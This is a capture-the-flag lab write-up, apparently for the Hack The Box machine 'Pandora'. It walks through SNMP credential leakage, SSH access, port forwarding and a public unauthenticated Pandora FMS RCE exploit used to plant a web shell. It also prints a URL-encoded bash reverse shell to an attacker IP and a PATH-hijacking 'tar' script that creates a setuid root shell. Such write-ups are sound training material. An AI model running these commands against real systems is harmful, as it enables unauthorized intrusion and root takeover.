Main steps
1. UDP scan for open port 161
2. Scan `SNMP` with default community string and get credentials
3. SSH access and enumerate `/var/www` to find internal website
4. Port forward to access internal site
5. Enumerate web application and locate public exploit
6. Use public exploit to gain user shell access
7. Upload SSH key and gain SSH user access
8. Enumerate `SUID` to fin `SUID` binary
9. Enumerate binary using `ltrace` or `cat` to find what command it tries to run
10. Hijack the relative path it uses to run the command to launch a root shell

Learning points
1. `ltrace` can be used to view executable commands
2. Check for public exploits properly
3. Remember to check for relative paths for hijacking
4. If `sudo` and `SUID` binaries do not seem to run properly, try getting SSH access

`nmap`
![[Pasted image 20260313182845.png]]

Ports 22, 80 open
Found a domain name on the website `panda.htb` and added to `/etc/hosts`

`Whatweb` shows that the site may be running `Wordpress` but `wpscan` does not work.
![[Pasted image 20260313183033.png]]

`Feroxbuster` did not find anything interesting.
`ffuf` also returned no subdomains.

Tried doing a UDP scan and found an open port 161 `SNMP`
Ran `snmpbulkwalk` with the `public` community string and found some credentials.
![[Pasted image 20260313184009.png]]

There is some binary `/usr/bin/host_check` running on the system using these credentials:
`daniel`: ` HotelBabylon23 `

Tried to SSH into the machine with these credentials and was able to get access as user `daniel`.
![[Pasted image 20260313184139.png]]

`/etc/passwd` shows that there is another user named `matt`. Will need to pivot to this user to get the user flag.
![[Pasted image 20260313184401.png]]

Nothing interesting in `daniel`'s home directory, so checked `/var/www` and found a directory `pandora` owned by `matt.`
![[Pasted image 20260313184435.png]]

Seems to be a separate application that is not accessible normally. Checked the apache `/sites-enabled` folder and found a separate config file for `pandora` which shows that it is running on `localhost:80`.
![[Pasted image 20260313184633.png]]

Checking this port using `nc localhost 80` and sending a random string confirms that `pandora` is running on `localhost:80`, with a subdomain `pandora.panda.htb`.
![[Pasted image 20260313184752.png]]

Ran `chisel` to port forward the internal application to my machine and was able to access the `pandora` dashboard, leading me to a login page for `Pandora FMS`.
![[Pasted image 20260313185418.png]]

There is also a version number on the page `v7.0NG.742_FIX_PERL2020`.

Tried logging in with the default credentials `root`: `pandora` but was unsuccessful.

Checked the `pandora` config files at `/pandora_console/include/config.inc.php` and found some database credentials, but they seem like default values.

Based on the Docker setup files, the database credentials are in `/include/config.php`. However, the user `daniel` does not have read access to this file. Only users `matt` and `apache` have access.
![[Pasted image 20260313190205.png]]

From the `audit.log` files, I can see that there are 2 users for `pandora`: `admin`, and `matt`.
![[Pasted image 20260313191819.png]]

Some more Googling shows that there is actually an unauthenticated version of the RCE exploit for this version of `pandora FMS`, CVE-2021-32099. Found a POC at https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated so I downloaded it to try it.

Port forwarding with `chisel` was incredibly laggy so I tried using SSH to port forward instead, by connecting to `daniel` with `ssh daniel@panda.htb -L 9001:localhost:80`.

Ran the exploit and was able to upload a PHP web shell.
![[Pasted image 20260313193557.png]]
![[Pasted image 20260313193602.png]]

Ran a URL encoded `bash` reverse shell with `bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.77%2F4444%200%3E%261%27`and was able to get a shell as `matt`.
![[Pasted image 20260313193829.png]]

Checked `sudo -l` but got an error.
Checked `SUID` binaries and found a `/usr/bin/pandora_backup` with its `SUID` bit set.
![[Pasted image 20260313194140.png]]

Tried to `cat` the binary and got some interesting strings. The binary is trying to run the command `tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/`. Running the binary gives the error message the the backup failed and to check permissions.
![[Pasted image 20260313194513.png]]

The inability to execute `sudo` and run `SUID` binaries properly seems to be an issue with how `apache` is configured. Here https://0xdf.gitlab.io/2022/05/21/htb-pandora.html#beyond-root is a short writeup on the restrictions that `apache` places to prevent privilege escalation.

Generated an SSH keypair and added it to `matt`'s SSH `authorized_keys` file to get SSH access.

Now, running the `pandora_backup` binary results in a successful backup.
![[Pasted image 20260313195645.png]]

Ran `ltrace` to see exactly what the binary is trying to run.
![[Pasted image 20260313195909.png]]

The binary seems to be calling `tar` directly from PATH, without using an absolute value (such as `/usr/bin/tar`). This means that I can overwrite the binary being called by writing my own `tar` binary and calling `pandora_backup` from the working directory.

Wrote a script to launch a root shell using `echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/script\nchown root:root /tmp/script\nchmod 6777 /tmp/script' >> tar` and `chmod +x`, then exported my working directory to PATH using `export PATH=$(pwd):$PATH`.

Ran the `pandora_backup` binary, then `/tmp/script -p` and launched a shell as root.
![[Pasted image 20260313200710.png]]

